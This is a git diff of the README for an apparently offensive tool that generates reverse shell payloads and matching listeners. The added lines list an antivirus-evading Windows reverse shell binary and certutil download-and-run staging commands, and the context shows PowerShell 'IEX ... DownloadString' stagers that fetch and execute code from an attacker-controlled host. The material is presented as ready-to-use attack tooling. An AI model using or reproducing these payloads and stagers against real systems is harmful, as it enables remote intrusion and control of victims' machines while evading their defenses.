@@ -21,6 +21,7 @@ Tool created to automate the creation of payloads to get a reverse shell, making
 * reverse_tcp_python
 * reverse_tcp_python_pty (prepared to make it interactive: ctr+z, stty raw -echo, fg)
 * reverse_tcp_ruby
+* reverse_tcp_win_shellexe (generates undetected atm reverse shell binary. Requires special stager)
 * reverse_socat_ssl
 * reverse_udp_dnscat2 (powershell, stager required)
 * reverse_udp_netcatbsd (no -e option)
@@ -33,7 +34,8 @@ Various techinques used to deliver staged payloads. Only http at the moment:
 * certutil & powershell -ep bypass -nop -f
 * certutil & type 2 powershell -nop -
 * echo IEX Webclient 2 powershell -nop -
-
+* certutil & PARAM1\shell.exe LHOST LPORT
+* certutil & PARAM1\file.exe PARAM2
 
 ### Connectors
 Connectors are the confguration settings that allow to chatch the shell executed for the payload
@@ -41,6 +43,7 @@ Connectors are the confguration settings that allow to chatch the shell executed
 * reverse_tcp6_netcat
 * reverse_tcp_ncat_ssl
 * reverse_tcp_netcat
+* reverse_tcp_rlwrap_netcat (NEW! Semi-interactive shell for windos w. histrory)
 * reverse_tcp_openssl
 * reverse_socat_ssl
 * reverse_udp_dnscat2 (require have ruby + server installed and working prior to use it)
@@ -99,7 +102,7 @@ echo%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2F10.0
 [*] Serving stage at port 80
 ...
 ```
-## Creating you own...
+## Creating your own...
 ### Payloads
 ```
 title=bash TCP reverse shell payload
@@ -149,3 +152,5 @@ payload=echo IEX(New-Object Net.WebClient).DownloadString('http://LHOST:SPORT/FI
 * [Inovke-PowerShellIcmp.ps1](https://github.com/samratashok/nishang) from Samratashok
 * [dnscat2.ps1](https://github.com/lukebaggett/dnscat2-powershell) from Luke Bagget
 * [php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz) from PentestMonkey
+* [Windows Revshell](https://github.com/infoskirmish/Window-Tools/tree/master/Simple%20Reverse%20Shell) form infoSkirmish
+
